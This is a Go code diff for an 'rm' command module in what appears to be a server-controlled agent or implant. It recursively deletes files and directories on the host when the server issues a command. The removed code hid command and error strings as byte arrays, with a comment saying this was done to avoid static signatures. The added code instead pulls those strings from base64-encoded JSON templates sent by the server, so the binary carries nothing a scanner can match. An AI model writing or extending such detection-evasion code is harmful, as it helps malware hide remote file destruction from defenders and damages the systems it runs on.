@@ -5,6 +5,8 @@
 package main
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -12,28 +14,69 @@ import (
 	"time"
 )
 
-// RM strings (constructed to avoid static signatures)
-var (
-	// Flag arguments
-	rmFlagRecursive = string([]byte{0x2d, 0x2d, 0x72, 0x65, 0x63, 0x75, 0x72, 0x73, 0x69, 0x76, 0x65}) // --recursive
-	rmFlagForce     = string([]byte{0x2d, 0x2d, 0x66, 0x6f, 0x72, 0x63, 0x65})                         // --force
+// RmTemplate receives string templates from server
+type RmTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
 
-	// Command name
-	rmCmdName = string([]byte{0x72, 0x6d}) // rm
+// RM template indices (must match server's common.go)
+const (
+	// Flags (short form - server transforms long flags before sending)
+	idxRmFlagRecursive = 240 // -r
+	idxRmFlagForce     = 241 // -f
 
-	// Error pattern strings for parseRemovalError
-	rmErrPermDenied    = string([]byte{0x70, 0x65, 0x72, 0x6d, 0x69, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x64, 0x65, 0x6e, 0x69, 0x65, 0x64})                                                             // permission denied
-	rmErrDirNotEmpty   = string([]byte{0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x65, 0x6d, 0x70, 0x74, 0x79})                                                 // directory not empty
-	rmErrResBusy       = string([]byte{0x72, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x62, 0x75, 0x73, 0x79})                                                                                     // resource busy
-	rmErrDevResBusy    = string([]byte{0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x6f, 0x72, 0x20, 0x72, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x62, 0x75, 0x73, 0x79})                         // device or resource busy
-	rmErrReadOnly      = string([]byte{0x72, 0x65, 0x61, 0x64, 0x2d, 0x6f, 0x6e, 0x6c, 0x79, 0x20, 0x66, 0x69, 0x6c, 0x65, 0x20, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d})                                     // read-only file system
-	rmErrOpNotPermit   = string([]byte{0x6f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x70, 0x65, 0x72, 0x6d, 0x69, 0x74, 0x74, 0x65, 0x64})                         // operation not permitted
+	// Error patterns (for parseRemovalError)
+	idxRmErrPermDenied   = 242 // permission denied
+	idxRmErrDirNotEmpty  = 243 // directory not empty
+	idxRmErrResourceBusy = 244 // resource busy
+	idxRmErrNotExist     = 245 // does not exist
+	idxRmErrIsDirectory  = 246 // is a directory
 )
 
 // RmCommand handles file and directory removal
-type RmCommand struct{}
+type RmCommand struct {
+	tpl *RmTemplate
+}
+
+// getTpl safely retrieves a template string by index
+func (c *RmCommand) getTpl(idx int) string {
+	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
+		return c.tpl.Templates[idx]
+	}
+	return ""
+}
 
 func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	// Parse template from Command.Data - required for operation
+	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	if err != nil {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	c.tpl = &RmTemplate{}
+	if err := json.Unmarshal(decoded, c.tpl); err != nil {
+		return CommandResult{
+			Output:      Err(E18),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
 	// Check if no arguments provided
 	if len(args) == 0 {
 		return CommandResult{
@@ -42,6 +85,10 @@ func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
+
+	// Get flag strings from template
+	flagRecursive := c.getTpl(idxRmFlagRecursive) // -r
+	flagForce := c.getTpl(idxRmFlagForce)         // -f
 
 	// Parse flags
 	recursive := false
@@ -64,9 +111,9 @@ func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 			} else if flagStr == "f" {
 				force = true
 			}
-		} else if arg == rmFlagRecursive {
+		} else if arg == flagRecursive {
 			recursive = true
-		} else if arg == rmFlagForce {
+		} else if arg == flagForce {
 			force = true
 		} else {
 			// It's a target file/directory
@@ -162,10 +209,10 @@ func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 			}
 
 			// Remove directory recursively
-			removedCount, err := removeAllWithDetails(targetPath, force)
+			removedCount, err := c.removeAllWithDetails(targetPath, force)
 			if err != nil {
 				// Parse the error to provide more helpful messages
-				errMsg := parseRemovalError(target, err)
+				errMsg := c.parseRemovalError(target, err)
 				errors = append(errors, errMsg)
 				hasErrors = true
 				if removedCount > 0 {
@@ -228,8 +275,8 @@ func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	}
 }
 
-// Modified removeAllWithDetails function from action_rm.go
-func removeAllWithDetails(path string, force bool) (int, error) {
+// removeAllWithDetails recursively removes directory contents
+func (c *RmCommand) removeAllWithDetails(path string, force bool) (int, error) {
 	removedCount := 0
 
 	// First, check if we can access the directory
@@ -262,7 +309,7 @@ func removeAllWithDetails(path string, force bool) (int, error) {
 
 		if entry.IsDir() {
 			// Recursively remove subdirectory
-			subCount, err := removeAllWithDetails(entryPath, force)
+			subCount, err := c.removeAllWithDetails(entryPath, force)
 			removedCount += subCount
 
 			if err != nil {
@@ -321,28 +368,25 @@ func removeAllWithDetails(path string, force bool) (int, error) {
 }
 
 // parseRemovalError creates error codes for removal errors
-func parseRemovalError(target string, err error) string {
+func (c *RmCommand) parseRemovalError(target string, err error) string {
 	errStr := err.Error()
 
+	// Get error patterns from template
+	errPermDenied := c.getTpl(idxRmErrPermDenied)
+	errDirNotEmpty := c.getTpl(idxRmErrDirNotEmpty)
+	errResourceBusy := c.getTpl(idxRmErrResourceBusy)
+
 	// Check for common error patterns
-	if strings.Contains(errStr, rmErrPermDenied) || strings.Contains(errStr, E3) || os.IsPermission(err) {
+	if strings.Contains(errStr, errPermDenied) || strings.Contains(errStr, E3) || os.IsPermission(err) {
 		return ErrCtx(E3, target)
 	}
 
-	if strings.Contains(errStr, rmErrDirNotEmpty) || strings.Contains(errStr, E16) {
+	if strings.Contains(errStr, errDirNotEmpty) || strings.Contains(errStr, E16) {
 		return ErrCtx(E16, target)
 	}
 
-	if strings.Contains(errStr, rmErrResBusy) || strings.Contains(errStr, rmErrDevResBusy) {
+	if strings.Contains(errStr, errResourceBusy) {
 		return ErrCtx(E13, target)
-	}
-
-	if strings.Contains(errStr, rmErrReadOnly) {
-		return ErrCtx(E14, target)
-	}
-
-	if strings.Contains(errStr, rmErrOpNotPermit) {
-		return ErrCtx(E15, target)
 	}
 
 	// Default: return the original error with the target
